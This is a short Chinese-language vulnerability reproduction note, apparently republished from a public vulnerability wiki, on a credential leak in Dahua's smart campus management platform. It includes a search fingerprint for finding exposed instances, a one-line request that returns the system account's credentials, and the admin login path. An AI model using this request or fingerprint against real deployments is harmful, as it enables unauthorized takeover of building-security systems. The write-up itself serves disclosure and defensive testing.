---
title: "大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞"
date: 2026-10-18 09:16:00
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "大华"
tags:
  - "大华"
  - "漏洞复现"
---
## 漏洞描述

大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏

## 漏洞影响

智慧园区综合管理平台

## 网络测绘

```
app="dahua-智慧园区综合管理平台"
```

## 漏洞复现

![image-20230828144644472](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144644472.png)

请求POC

```
/admin/user_getUserInfoByUserName.action?userName=system
```

![image-20230828144658624](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144658624.png)

获取后访问地址

```
/admin/login_login.action
```

![image-20230828144732646](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144732646.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-user_getUserInfoByUserName.action-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
